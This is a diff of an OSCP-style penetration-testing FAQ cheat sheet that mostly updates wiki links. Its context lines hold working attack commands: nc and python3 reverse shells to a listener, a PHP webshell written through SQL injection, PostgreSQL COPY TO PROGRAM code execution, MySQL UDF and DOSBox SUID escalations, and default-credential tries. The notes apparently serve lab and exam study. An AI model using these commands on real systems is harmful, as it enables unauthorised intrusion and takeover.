@@ -26,16 +26,16 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 ## Discovery
 
 ### "I've got open ports, what now?"
-→ [[Port Scan - Results Triage]], triage by service, then pick a lane
+→ [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], triage by service, then pick a lane
 
 ### "Nmap is taking forever"
 → `nmap -p- --min-rate 10000 $BoxIP` first pass, then `-sC -sV -p <ports>` on what comes back
 
 ### "I can see a web port, where do I start?"
-→ [[HTTP - Initial Recon]], browser first, then dir brute
+→ [[RUNBOOK V2/Linux - Web Enum|HTTP - Initial Recon]], browser first, then dir brute
 
 ### "I only see one open port and it's not obvious"
-→ [[Port Scan - Results Triage]], add UDP: `sudo nmap -sU --top-ports 20 $BoxIP`
+→ [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], add UDP: `sudo nmap -sU --top-ports 20 $BoxIP`
 
 ### "How do I know what version something is running?"
 → `nmap -sV` on the port, then searchsploit or [HackTricks](https://book.hacktricks.xyz) for that service + version
@@ -45,35 +45,35 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 ## Footprinting
 
 ### "SMB is open, what can I do without creds?"
-→ [[SMB - Null Session]], null session listing first
+→ [[RUNBOOK V2/Windows - SMB Enum|SMB - Null Session]], null session listing first
 
 ### "FTP is open, worth trying?"
-→ [[FTP - Anonymous]], anonymous login first, always
+→ [[RUNBOOK V2/Linux - FTP Enumeration|FTP - Anonymous]], anonymous login first, always
 
 ### "There's a web app — how do I find the hidden stuff?"
-→ [[HTTP - Directory Brute]], run a dir brute, recurse into anything that returns 200/301
+→ [[RUNBOOK V2/Linux - Web Enum|HTTP - Directory Brute]], run a dir brute, recurse into anything that returns 200/301
 
 ### "I think it's running WordPress / Joomla / Drupal"
-→ [[HTTP - CMS Detection]], check `/wp-login.php`, `wpscan`, `droopescan`
+→ [[RUNBOOK V2/Linux - CMS Check|HTTP - CMS Detection]], check `/wp-login.php`, `wpscan`, `droopescan`
 
 ### "There are vhosts / subdomains — how do I find them?"
-→ [[HTTP - Subdomain Enum]] ← [[06. Information Gathering|Information Gathering]]
+→ [[RUNBOOK V2/Web - Virtual Host Enumeration|HTTP - Subdomain Enum]] ← [[06. Information Gathering|Information Gathering]]
 
 ---
 
 ## Foothold
 
 ### "I've got a shell but it's rubbish, how do I make it not rubbish?"
-→ [[Shell - Upgrade]], `python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg`
+→ [[RUNBOOK V2/Linux - Shell Stabilise|Shell - Upgrade]], `python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg`
 
 ### "I've got creds but nowhere obvious to use them"
-→ [[Port Scan - Results Triage]], spray across SSH, SMB, RDP, WinRM, HTTP login forms
+→ [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], spray across SSH, SMB, RDP, WinRM, HTTP login forms
 
 ### "I found a file upload, can I get a shell from it?"
-→ [[Foothold - File Upload]], check what extensions are blocked and where files land
+→ [[RUNBOOK V2/Linux - File Upload|Foothold - File Upload]], check what extensions are blocked and where files land
 
 ### "I found what looks like command injection"
-→ [[Web App - Command Injection]], test with `; id`, `| id`, `&& id`, backticks
+→ [[RUNBOOK V2/Linux - Command Injection|Web App - Command Injection]], test with `; id`, `| id`, `&& id`, backticks
 
 ### "The box has a CVE — where do I start?"
 → [[13. Locating Public Exploits|Locating Public Exploits]], `searchsploit`, GitHub, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Read the exploit before running it.
@@ -83,19 +83,19 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 ## PrivEsc
 
 ### "I'm on Linux, where do I even start?"
-→ [[PrivEsc Linux - Initial Enum]], `linpeas.sh` first, then `sudo -l`, SUID, cron
+→ [[RUNBOOK V2/Linux - Local Enum|PrivEsc Linux - Initial Enum]], `linpeas.sh` first, then `sudo -l`, SUID, cron
 
 ### "I'm on Windows, where do I even start?"
-→ [[PrivEsc Windows - Initial Enum]], `winPEAS.exe` first, then services, scheduled tasks, unquoted paths
+→ [[RUNBOOK V2/Windows - Privilege Triage|PrivEsc Windows - Initial Enum]], `winPEAS.exe` first, then services, scheduled tasks, unquoted paths
 
 ### "sudo -l shows something but I don't know what to do with it"
 → [GTFOBins](https://gtfobins.github.io), search the binary, pick the `sudo` section
 
 ### "I can see a service running as SYSTEM/root"
-→ [[PrivEsc Windows - Services]] or [[PrivEsc Linux - Writable Config]], is the binary or config writable?
+→ [[RUNBOOK V2/Windows - Service Abuse|PrivEsc Windows - Services]] or [[RUNBOOK V2/Linux - Local Enum|PrivEsc Linux - Writable Config]], is the binary or config writable?
 
 ### "There's a cronjob / scheduled task"
-→ [[PrivEsc Linux - Cron]] / [[PrivEsc Windows - Scheduled Tasks]], can you write the target script/binary?
+→ [[RUNBOOK V2/Linux - Cron Check|PrivEsc Linux - Cron]] / [[RUNBOOK V2/Windows - Scheduled Task Abuse|PrivEsc Windows - Scheduled Tasks]], can you write the target script/binary?
 
 ### "I've got a hash, how do I use it?"
 → [[16. Password Attacks|Password Attacks]], crack with hashcat (identify type with hash-identifier first) or pass-the-hash if NTLM
@@ -105,10 +105,10 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 ## Web App
 
 ### "There's a login form"
-→ Try `admin:admin`, `admin:password`, `admin:$BoxName` first, then [[Web App - SQLi]] for bypass
+→ Try `admin:admin`, `admin:password`, `admin:$BoxName` first, then [[RUNBOOK V2/Linux - SQLi|Web App - SQLi]] for bypass
 
 ### "I think it's LFI"
-→ [[Web App - LFI]], start with `../../../etc/passwd`, escalate to log poisoning or PHP wrappers
+→ [[RUNBOOK V2/Linux - LFI|Web App - LFI]], start with `../../../etc/passwd`, escalate to log poisoning or PHP wrappers
 
 ### "LFI returned a long encoded backup"
 → Save the raw response first, strip only the known banner or wrapper lines, decode in a bounded loop, and write the result to private loot. Validate it once against the identified service without printing the credential in notes or screenshots. See [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]]
@@ -117,10 +117,10 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 → Recheck listeners with the target-native tool (`netstat -an` on FreeBSD), identify the process and exact port, then use `ssh -N -L $TunnelPort:127.0.0.1:$RemotePort $Username@$BoxIP -f` and verify the Kali-side listener before using the client. See [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]]
 
 ### "I think it's SQLi — where do I inject?"
-→ [[Web App - SQLi]], test manually with `'`, `"`, `'--`, `1=1--` before anything else
+→ [[RUNBOOK V2/Linux - SQLi|Web App - SQLi]], test manually with `'`, `"`, `'--`, `1=1--` before anything else
 
 ### "The app is making outbound requests to something I control"
-→ [[Web App - SSRF]], probe `http://127.0.0.1:PORT`, internal services, cloud metadata endpoint
+→ [[Web Applications (Decision Tree)|Web App - SSRF]], probe `http://127.0.0.1:PORT`, internal services, cloud metadata endpoint
 
 ### "I need to encode/decode/transform something weird"
 → [CyberChef](https://gchq.github.io/CyberChef/), it does everything
@@ -145,31 +145,31 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 → [[17. Windows Privilege Escalation]], python HTTP server + curl/wget/iwr, or base64 encode it
 
 ### "I'm completely stuck and have been on this for a while"
-→ Back to [[Port Scan - Results Triage]], missed port? missed vhost? missed parameter? check [ippsec.rocks](https://ippsec.rocks) for the box name or a technique keyword
+→ Back to [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], missed port? missed vhost? missed parameter? check [ippsec.rocks](https://ippsec.rocks) for the box name or a technique keyword
 
 ### "Port 80 root just returns a blank page / placeholder — is there anything there?"
-→ Yes, always dir bust it. `gobuster dir -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt` — apps are frequently installed under subdirectories (`/test/`, `/wordpress/`, `/admin/`). A blank root does not mean an empty server. See [[HTTP - Directory Brute]].
+→ Yes, always dir bust it. `gobuster dir -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt` — apps are frequently installed under subdirectories (`/test/`, `/wordpress/`, `/admin/`). A blank root does not mean an empty server. See [[RUNBOOK V2/Linux - Web Enum|HTTP - Directory Brute]].
 
 ### "The page source has version info in it — is that useful?"
 → Yes. Always `curl -s http://$URL | grep -i "version\|powered by\|generator"` and check the HTML comments at the bottom of the page. Developers leave version strings in comments constantly. That version feeds directly into searchsploit.
 
 ### "I have a kernel version from `uname -a` — how do I find the right exploit?"
-→ 1) Broad search: `searchsploit linux kernel <major.minor>`. 2) Google: `"linux <version> local privilege escalation"`. 3) Specific keyword search: `searchsploit rds kernel`, `searchsploit dirty cow`, etc. "RDS" and "Dirty COW" aren't obvious cold — research is the step between `uname -a` and the exploit. See [[PrivEsc Linux - Kernel]].
+→ 1) Broad search: `searchsploit linux kernel <major.minor>`. 2) Google: `"linux <version> local privilege escalation"`. 3) Specific keyword search: `searchsploit rds kernel`, `searchsploit dirty cow`, etc. "RDS" and "Dirty COW" aren't obvious cold — research is the step between `uname -a` and the exploit. See [[RUNBOOK V2/Linux - Kernel Exploit|PrivEsc Linux - Kernel]].
 
 ### "There's a PostgreSQL port open — what's the first thing to try?"
-→ `psql -h $BoxIP -p $Port -U postgres` with password `postgres`. If that fails try blank password or `$BoxName`. Then `SELECT current_setting('is_superuser');` to confirm superuser before attempting COPY TO PROGRAM RCE. See [[PostgreSQL - Initial Access]].
+→ `psql -h $BoxIP -p $Port -U postgres` with password `postgres`. If that fails try blank password or `$BoxName`. Then `SELECT current_setting('is_superuser');` to confirm superuser before attempting COPY TO PROGRAM RCE. See [[RUNBOOK V2/Linux - Database Access|PostgreSQL - Initial Access]].
 
 ### "COPY TO PROGRAM gives exit code 2 / syntax error"
-→ COPY TO PROGRAM runs via `/bin/sh` (dash on Debian), not bash. `>&` and `/dev/tcp` are bash-only and will fail. Use `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP $Port >/tmp/f` instead. If nc fails, try port 80 (egress filtering). See [[PostgreSQL - COPY TO PROGRAM RCE]].
+→ COPY TO PROGRAM runs via `/bin/sh` (dash on Debian), not bash. `>&` and `/dev/tcp` are bash-only and will fail. Use `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP $Port >/tmp/f` instead. If nc fails, try port 80 (egress filtering). See [[RUNBOOK V2/Linux - Database Access|PostgreSQL - COPY TO PROGRAM RCE]].
 
 ### "I need to check what tools are on the box but I don't have a shell yet (PostgreSQL)"
 → COPY FROM PROGRAM reads command stdout into a table: `CREATE TABLE t (o text); COPY t FROM PROGRAM 'ls /usr/bin/nc* /usr/bin/python* 2>/dev/null; echo done'; SELECT * FROM t; DROP TABLE t;` — the `; echo done` is critical to force exit code 0 so COPY doesn't bail.
 
 ### "I confirmed SQLi but the response doesn't give me data — how do I get a shell?"
-→ If stacked queries work and you know the web root, write a webshell: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'`. Web root is often leaked in verbose SQL error messages in the response body. See [[Foothold - SQLi to Shell]].
+→ If stacked queries work and you know the web root, write a webshell: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'`. Web root is often leaked in verbose SQL error messages in the response body. See [[RUNBOOK V2/Linux - SQLi|Foothold - SQLi to Shell]].
 
 ### "I have MySQL root creds — is there a path to root from MySQL alone?"
-→ Yes, if MySQL runs as the root OS user: load the `lib_mysqludf_sys.so` UDF and call `sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')`, then `/tmp/rootbash -p`. See [[PrivEsc Linux - UDF]].
+→ Yes, if MySQL runs as the root OS user: load the `lib_mysqludf_sys.so` UDF and call `sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')`, then `/tmp/rootbash -p`. See [[RUNBOOK V2/Linux - Database Access|PrivEsc Linux - UDF]].
 
 ### "How do I know if MySQL is running as the root OS user?"
 → `ps aux | grep mysql`. If the process owner in column 1 is `root`, sys_exec commands run as root.
@@ -187,7 +187,7 @@ This is intentional. The goal is to make the module knowledge stick, not to be h
 → PHP's `system()` can silently drop complex piped command chains. Fallback: python3 reverse shell. Confirm Python3 is available (check other services on the box — a Flask app on port 5000 means Python3 is there). Use: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LocalIP",$Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`. Pass via `--data-urlencode` to handle the quotes.
 
 ### "dosbox is SUID root — how do I exploit it?"
-→ DOSBox is a DOS emulator. Its `-c` flag runs DOS commands at startup as the effective user (root, since SUID). Use `mount` to map a Linux directory to a DOS drive, then `echo` with redirection to write files as root: `dosbox -c 'mount c /etc' -c 'echo USER ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'`. ALSA errors are normal (no sound card) — ignore them. Then `sudo -n bash`. Restore sudoers after: `bsdtar -xOf /path/to/sudo-pkg.tar.zst etc/sudoers > /etc/sudoers`. See [[PrivEsc Linux - SUID]].
+→ DOSBox is a DOS emulator. Its `-c` flag runs DOS commands at startup as the effective user (root, since SUID). Use `mount` to map a Linux directory to a DOS drive, then `echo` with redirection to write files as root: `dosbox -c 'mount c /etc' -c 'echo USER ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'`. ALSA errors are normal (no sound card) — ignore them. Then `sudo -n bash`. Restore sudoers after: `bsdtar -xOf /path/to/sudo-pkg.tar.zst etc/sudoers > /etc/sudoers`. See [[RUNBOOK V2/Linux - SUID Check|PrivEsc Linux - SUID]].
 
 ### "Magescan will not run against an old Magento box"
 → Magescan may fail under a current PHP and Composer environment because its legacy dependencies are blocked by security advisories, require older PHP versions, or need the missing PHP curl extension. Preserve the checkout as loot, record the dependency error, and use manual fingerprinting plus `searchsploit Magento` when the CMS and version are already established.
